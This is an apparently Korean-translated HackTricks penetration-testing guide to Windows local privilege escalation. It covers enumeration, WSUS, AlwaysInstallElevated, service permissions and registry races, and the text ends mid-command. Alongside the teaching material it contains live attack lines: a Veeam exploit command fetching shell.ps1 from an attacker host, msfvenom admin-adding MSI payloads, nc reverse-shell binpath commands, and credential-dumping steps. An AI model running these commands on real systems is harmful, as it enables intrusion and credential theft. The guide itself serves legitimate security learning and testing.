# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Windows local privilege escalation 벡터를 찾는 데 가장 좋은 도구:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## Initial Windows Theory

### Access Tokens

**Windows Access Tokens가 무엇인지 모르면, 계속하기 전에 다음 페이지를 읽으세요:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**ACLs - DACLs/SACLs/ACEs에 대한 자세한 내용은 다음 페이지를 확인하세요:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**Windows에서 integrity levels가 무엇인지 모르면, 계속하기 전에 다음 페이지를 읽으세요:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows Security Controls

Windows에는 시스템 열거를 **막거나**, 실행 파일을 실행하거나, 심지어 **활동을 탐지**할 수 있는 여러 요소가 있습니다. privilege escalation 열거를 시작하기 전에 다음 **페이지**를 **읽고**, 이 모든 **방어** **메커니즘**을 **열거**해야 합니다:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

### Admin Protection / UIAccess silent elevation

`RAiLaunchAdminProcess`를 통해 실행된 UIAccess 프로세스는 AppInfo secure-path 검사를 우회하면 프롬프트 없이 High IL에 도달하도록 악용될 수 있습니다. 전용 UIAccess/Admin Protection bypass 워크플로우는 여기에서 확인하세요:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Secure Desktop accessibility registry propagation는 임의의 SYSTEM registry write(RegPwn)에 악용될 수 있습니다:

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

## System Info

### Version info enumeration

Windows 버전에 알려진 vulnerability가 있는지 확인하세요(적용된 patches도 함께 확인).
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Version Exploits

이 [site](https://msrc.microsoft.com/update-guide/vulnerability)는 Microsoft 보안 취약점에 대한 자세한 정보를 검색할 때 유용합니다. 이 database에는 4,700개가 넘는 security vulnerabilities가 있으며, Windows 환경이 제공하는 **massive attack surface**를 보여줍니다.

**On the system**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas has watson embedded)_

**Locally with system information**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Github repos of exploits:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Environment

env variables에 저장된 credential/Juicy info가 있나요?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### PowerShell History
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### PowerShell Transcript files

다음에서 이를 켜는 방법을 배울 수 있습니다: [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

PowerShell pipeline 실행의 세부 정보가 기록되며, 실행된 command, command invocation, 그리고 script의 일부가 포함됩니다. 그러나 전체 execution 세부 정보와 output 결과는 캡처되지 않을 수 있습니다.

이를 활성화하려면 documentation의 "Transcript files" 섹션의 지침을 따르되, **"Powershell Transcription"** 대신 **"Module Logging"**을 선택하세요.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
PowersShell 로그에서 마지막 15개 이벤트를 보려면 다음을 실행할 수 있습니다:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

스크립트 실행의 완전한 활동과 전체 내용 기록이 캡처되어, 모든 코드 블록이 실행되는 동안 문서화되도록 보장합니다. 이 과정은 각 활동의 포괄적인 감사 추적을 보존하며, 포렌식과 악성 행위 분석에 유용합니다. 실행 시점에 모든 활동을 문서화함으로써, 프로세스에 대한 상세한 인사이트를 제공합니다.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Script Block의 로깅 이벤트는 Windows Event Viewer에서 다음 경로에 있습니다: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
마지막 20개의 이벤트를 보려면 다음을 사용할 수 있습니다:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### 인터넷 설정
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### 드라이브
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

업데이트가 http**S**가 아니라 http를 사용하여 요청되는 경우 시스템을 손상시킬 수 있습니다.

다음 cmd에서 아래를 실행하여 네트워크가 비-SSL WSUS 업데이트를 사용하는지 확인하는 것으로 시작합니다:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
또는 PowerShell에서는:
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
다음과 같은 답변을 받는 경우:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
그리고 `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` 또는 `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"`가 `1`이면.

**그것은 exploitable.** 마지막 registry가 0이면 WSUS entry는 무시된다.

이 vulnerabilities를 exploit하려면 다음과 같은 tools를 사용할 수 있다: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus)- 이들은 비-SSL WSUS traffic에 'fake' updates를 주입하기 위한 MiTM weaponized exploits scripts이다.

연구 내용은 여기에서 읽을 수 있다:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**전체 report를 여기에서 읽기**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
기본적으로, 이것이 이 bug가 exploit하는 flaw이다:

> 우리가 local user proxy를 modify할 수 있고, Windows Updates가 Internet Explorer의 settings에 configured된 proxy를 사용한다면, 따라서 우리는 [PyWSUS](https://github.com/GoSecure/pywsus)를 local에서 실행하여 우리 자신의 traffic을 intercept하고 asset에서 elevated user로 code를 실행할 수 있는 power를 갖게 된다.
>
> 또한 WSUS service는 current user의 settings를 사용하므로 certificate store도 사용한다. WSUS hostname에 대한 self-signed certificate를 생성하고 이 certificate를 current user's certificate store에 추가하면 HTTP와 HTTPS WSUS traffic 모두를 intercept할 수 있다. WSUS는 certificate에 대해 trust-on-first-use type validation을 구현하는 HSTS-like mechanisms를 사용하지 않는다. 제시된 certificate가 user에게 trusted이고 올바른 hostname을 가지고 있다면 service에 의해 accepted 된다.

tool [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (liberated 된 후)을 사용하여 이 vulnerability를 exploit할 수 있다.

## Third-Party Auto-Updaters and Agent IPC (local privesc)

많은 enterprise agents는 localhost IPC surface와 privileged update channel을 노출한다. enrollment를 attacker server로 강제할 수 있고 updater가 rogue root CA 또는 weak signer checks를 신뢰한다면, local user는 SYSTEM service가 설치하는 malicious MSI를 전달할 수 있다. 일반화된 technique (Netskope stAgentSvc chain – CVE-2025-0309 기반)은 여기에서 확인할 수 있다:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (TCP 9401을 통한 SYSTEM)

Veeam B&R < `11.0.1.1261`은 attacker-controlled messages를 처리하는 localhost service를 **TCP/9401**에 노출하며, 이를 통해 **NT AUTHORITY\SYSTEM**으로 arbitrary commands를 실행할 수 있다.

- **Recon**: listener와 version을 확인한다. 예: `netstat -ano | findstr 9401` 및 `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`.
- **Exploit**: 필요한 Veeam DLL들과 함께 `VeeamHax.exe` 같은 PoC를 같은 directory에 두고, local socket을 통해 SYSTEM payload를 트리거한다:
```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```
The service executes the command as SYSTEM.
## KrbRelayUp

Windows **domain** 환경에서는 특정 조건에서 **local privilege escalation** 취약점이 존재합니다. 이러한 조건에는 **LDAP signing is not enforced,** 사용자가 **Resource-Based Constrained Delegation (RBCD)** 를 구성할 수 있는 self-rights를 보유하고 있으며, 사용자가 도메인 내에서 컴퓨터를 생성할 수 있는 기능이 포함됩니다. 이러한 **requirements** 는 **default settings** 를 사용해 충족된다는 점이 중요합니다.

익스플로잇은 [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp) 에서 찾을 수 있습니다.

공격 흐름에 대한 자세한 내용은 [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/) 를 확인하세요.

## AlwaysInstallElevated

이 2개의 register가 **enabled** 상태이고(value is **0x1**), 그러면 어떤 권한의 사용자든 `*.msi` 파일을 NT AUTHORITY\\**SYSTEM** 으로 **install**(execute) 할 수 있습니다.
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
If you have a meterpreter session you can automate this technique using the module **`exploit/windows/local/always_install_elevated`**

### PowerUP

power-up의 `Write-UserAddMSI` 명령을 사용하여 현재 디렉터리 안에 권한 상승을 위해 Windows MSI 바이너리를 생성합니다. 이 스크립트는 사용자/그룹 추가를 요청하는 사전 컴파일된 MSI 설치 프로그램을 작성합니다(따라서 GIU 접근이 필요합니다):
```
Write-UserAddMSI
```
Just execute the created binary to escalate privileges.

### MSI Wrapper

이 도구를 사용하여 MSI wrapper를 만드는 방법은 이 튜토리얼을 읽어보세요. **.bat** 파일을 **그냥** **command lines**를 **실행**하고 싶을 때도 래핑할 수 있다는 점에 주의하세요.


{{#ref}}
msi-wrapper.md
{{#endref}}

### Create MSI with WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Create MSI with Visual Studio

- Cobalt Strike 또는 Metasploit으로 `C:\privesc\beacon.exe`에 **새 Windows EXE TCP payload**를 **Generate**합니다.
- **Visual Studio**를 열고 **Create a new project**를 선택한 뒤 검색 상자에 "installer"를 입력합니다. **Setup Wizard** 프로젝트를 선택하고 **Next**를 클릭합니다.
- 프로젝트 이름을 **AlwaysPrivesc** 같은 이름으로 지정하고, 위치는 **`C:\privesc`**를 사용한 뒤 **place solution and project in the same directory**를 선택하고 **Create**를 클릭합니다.
- 4단계 중 3단계(포함할 파일 선택)에 도달할 때까지 **Next**를 계속 클릭합니다. **Add**를 클릭하고 방금 생성한 Beacon payload를 선택합니다. 그런 다음 **Finish**를 클릭합니다.
- **Solution Explorer**에서 **AlwaysPrivesc** 프로젝트를 선택하고 **Properties**에서 **TargetPlatform**을 **x86**에서 **x64**로 변경합니다.
- **Author**와 **Manufacturer** 같은 다른 속성도 변경할 수 있으며, 이를 통해 설치된 앱이 더 정식처럼 보이게 할 수 있습니다.
- 프로젝트를 오른쪽 클릭하고 **View > Custom Actions**를 선택합니다.
- **Install**을 오른쪽 클릭하고 **Add Custom Action**을 선택합니다.
- **Application Folder**를 더블클릭하고 **beacon.exe** 파일을 선택한 뒤 **OK**를 클릭합니다. 이렇게 하면 설치 프로그램이 실행되는 즉시 beacon payload가 실행됩니다.
- **Custom Action Properties**에서 **Run64Bit**를 **True**로 변경합니다.
- 마지막으로 **build it** 합니다.
- `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` 경고가 표시되면 platform이 x64로 설정되어 있는지 확인하세요.

### MSI Installation

악성 `.msi` 파일의 **installation**을 **background**에서 실행하려면:
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
이 취약점을 악용하려면 다음을 사용할 수 있습니다: _exploit/windows/local/always_install_elevated_

## Antivirus and Detectors

### Audit Settings

이 설정들은 무엇이 **로그로 남는지**를 결정하므로, 주의해야 합니다
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding는 로그가 어디로 전송되는지 알아두면 흥미롭다
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS**는 **로컬 Administrator 비밀번호 관리**를 위해 설계되었으며, 도메인에 가입된 컴퓨터에서 각 비밀번호가 **고유하고, 무작위이며, 정기적으로 업데이트**되도록 보장합니다. 이러한 비밀번호는 Active Directory에 안전하게 저장되며, ACL을 통해 충분한 권한을 부여받은 사용자만 접근할 수 있어, 승인된 경우 로컬 admin 비밀번호를 볼 수 있습니다.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

활성화되어 있으면, **평문 비밀번호가 LSASS** (Local Security Authority Subsystem Service)에 저장됩니다.\
[**이 페이지에서 WDigest에 대한 더 많은 정보**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA Protection

**Windows 8.1**부터 Microsoft는 Local Security Authority (LSA)에 대한 향상된 보호 기능을 도입하여, 신뢰되지 않은 프로세스가 **메모리를 읽거나** 코드를 주입하려는 시도를 **차단**하고, 시스템 보안을 더욱 강화했습니다.\
[**LSA Protection에 대한 자세한 정보는 여기**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard**는 **Windows 10**에서 도입되었습니다. 그 목적은 pass-the-hash attacks 같은 위협으로부터 디바이스에 저장된 credentials를 보호하는 것입니다.| [**More info about Credentials Guard here.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### 캐시된 자격 증명

**Domain credentials**는 **Local Security Authority**(LSA)에 의해 인증되며 운영체제 구성 요소에서 사용됩니다. 사용자의 로그온 데이터가 등록된 보안 패키지에 의해 인증되면, 일반적으로 해당 사용자의 domain credentials가 설정됩니다.\
[**캐시된 자격 증명에 대한 자세한 정보는 여기**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## Users & Groups

### Users & Groups 열거

자신이 속한 그룹 중 interesting permissions를 가진 그룹이 있는지 확인해야 합니다.
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### Privileged groups

만약 **어떤 privileged group에 속해 있다면 privilege를 escalate할 수 있을 수 있습니다**. privileged group에 대해 배우고 이를 악용해 privilege를 escalate하는 방법은 여기에서 확인하세요:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token manipulation

**token이 무엇인지 더 알아보려면** 이 페이지를 확인하세요: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
다음 페이지에서 **흥미로운 token에 대해 배우고**, 이를 어떻게 악용하는지 확인하세요:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Logged users / Sessions
```bash
qwinsta
klist sessions
```
### 홈 폴더
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### 비밀번호 정책
```bash
net accounts
```
### 클립보드의 내용 가져오기
```bash
powershell -command "Get-Clipboard"
```
## 실행 중인 프로세스

### 파일 및 폴더 권한

우선, 프로세스의 명령줄 안에 비밀번호가 있는지 확인하면서 프로세스 목록을 살펴보세요.\
실행 중인 일부 바이너리를 **덮어쓸 수 있는지** 또는 바이너리 폴더에 대한 쓰기 권한이 있는지 확인하여 가능한 [**DLL Hijacking attacks**](dll-hijacking/index.html)를 악용하세요:
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
Always check for possible [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md).

**프로세스 바이너리의 권한 확인**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**프로세스 바이너리의 폴더 권한 확인 (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Memory Password mining

**procdump** from sysinternals를 사용하면 실행 중인 프로세스의 memory dump를 만들 수 있습니다. FTP 같은 서비스는 **credentials가 memory에 clear text로 존재**할 수 있으므로, memory를 dump해서 credentials를 읽어 보세요.
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### Insecure GUI apps

**SYSTEM으로 실행 중인 애플리케이션은 사용자가 CMD를 실행하거나 디렉터리를 탐색하도록 허용할 수 있습니다.**

예: "Windows Help and Support" (Windows + F1)에서 "command prompt"를 검색하고, "Click to open Command Prompt"를 클릭

## Services

Service Triggers는 Windows가 특정 조건이 발생할 때 서비스가 시작되도록 합니다(명명된 파이프/RPC endpoint 활동, ETW events, IP availability, device arrival, GPO refresh 등). SERVICE_START 권한이 없어도 트리거를 발생시켜 권한이 높은 서비스를 시작할 수 있는 경우가 많습니다. 열거 및 활성화 기법은 여기에서 확인하세요:

-
{{#ref}}
service-triggers.md
{{#endref}}

서비스 목록을 가져오기:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### 권한

**sc**를 사용하여 서비스에 대한 정보를 얻을 수 있습니다
```bash
sc qc <service_name>
```
각 서비스에 필요한 권한 수준을 확인하기 위해 _Sysinternals_의 binary **accesschk**를 사용하는 것이 권장됩니다.
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
"Authenticated Users"가 어떤 서비스든 수정할 수 있는지 확인하는 것이 권장됩니다:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[You can download accesschk.exe for XP for here](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### 서비스 활성화

다음과 같은 오류가 발생하는 경우(예: SSDPSRV):

_System error 1058 has occurred._\
_The service cannot be started, either because it is disabled or because it has no enabled devices associated with it._

다음을 사용하여 활성화할 수 있습니다.
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**서비스 `upnphost`는 작동하기 위해 SSDPSRV에 의존한다는 점을 고려하라 (XP SP1의 경우)**

**이 문제의 또 다른 우회 방법**은 다음을 실행하는 것이다:
```
sc.exe config usosvc start= auto
```
### **Modify service binary path**

"Authenticated users" 그룹이 서비스에 대해 **SERVICE_ALL_ACCESS**를 가지고 있는 경우, 해당 서비스의 실행 파일 바이너리를 수정할 수 있습니다. **sc**를 수정하고 실행하려면:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### 서비스 재시작
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
권한은 다양한 permissions을 통해 상승될 수 있습니다:

- **SERVICE_CHANGE_CONFIG**: service binary를 재구성할 수 있습니다.
- **WRITE_DAC**: permission 재구성을 허용하여 service configurations를 변경할 수 있게 합니다.
- **WRITE_OWNER**: 소유권 획득과 permission 재구성을 허용합니다.
- **GENERIC_WRITE**: service configurations를 변경할 수 있는 능력을 상속합니다.
- **GENERIC_ALL**: 또한 service configurations를 변경할 수 있는 능력을 상속합니다.

이 취약점의 탐지와 exploitation을 위해 _exploit/windows/local/service_permissions_를 사용할 수 있습니다.

### Services binaries weak permissions

**service에 의해 실행되는 binary를 수정할 수 있는지** 또는 binary가 위치한 folder에 **write permissions**가 있는지 확인하세요 ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
**wmic**을 사용하면 service에 의해 실행되는 모든 binary를 얻을 수 있으며 (system32가 아닌) **icacls**로 permissions를 확인할 수 있습니다:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
**sc**와 **icacls**도 사용할 수 있습니다:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### 서비스 registry modify permissions

어떤 service registry를 수정할 수 있는지 확인해야 합니다.\
service **registry**에 대한 **permissions**는 다음과 같이 **check**할 수 있습니다:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
**Authenticated Users** 또는 **NT AUTHORITY\INTERACTIVE**가 `FullControl` 권한을 가지고 있는지 확인해야 한다. 그렇다면 서비스가 실행하는 binary를 변경할 수 있다.

실행되는 binary의 Path를 변경하려면:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Registry symlink race to arbitrary HKLM value write (ATConfig)

일부 Windows Accessibility 기능은 사용자별 **ATConfig** 키를 생성한 뒤, 이후 **SYSTEM** 프로세스가 이를 HKLM session key로 복사합니다. registry **symbolic link race**를 이용하면 이 권한 있는 쓰기를 **임의의 HKLM path**로 우회시킬 수 있어, arbitrary HKLM **value write** primitive를 얻을 수 있습니다.

주요 위치(예: On-Screen Keyboard `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` lists installed accessibility features.
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` stores user-controlled configuration.
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` is created during logon/secure-desktop transitions and is writable by the user.

Abuse flow (CVE-2026-24291 / ATConfig):

1. SYSTEM이 기록하게 만들 **HKCU ATConfig** 값을 채웁니다.
2. secure-desktop copy를 트리거합니다(예: **LockWorkstation**), 그러면 AT broker flow가 시작됩니다.
3. `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml`에 **oplock**을 걸어 **race**에서 승리합니다. oplock이 발동하면 **HKLM Session ATConfig** key를 보호된 HKLM target으로 향하는 **registry link**로 교체합니다.
4. SYSTEM이 공격자가 선택한 값을 redirected HKLM path에 기록합니다.

arbitrary HKLM value write를 얻으면, service configuration value를 덮어써 LPE로 pivot합니다:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/command line)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

일반 사용자가 시작할 수 있는 service를 고르고(예: **`msiserver`**) write 후에 트리거합니다. **Note:** 공개 exploit implementation은 race의 일부로 **locks the workstation** 합니다.

Example tooling (RegPwn BOF / standalone):
```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```
### Services registry AppendData/AddSubdirectory permissions

레지스트리에 대해 이 권한이 있다면, **이 레지스트리 아래에 하위 레지스트리를 만들 수 있다**는 뜻입니다. Windows 서비스의 경우, 이는 **임의 코드 실행에 충분합니다:**

{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

실행 파일 경로가 따옴표로 둘러싸여 있지 않으면, Windows는 공백 앞의 모든 경로를 각각 실행하려고 시도합니다.

예를 들어, 경로가 _C:\Program Files\Some Folder\Service.exe_인 경우 Windows는 다음을 실행하려고 시도합니다:
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
내장 Windows 서비스에 속한 항목을 제외한 모든 unquoted service paths를 나열하세요:
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
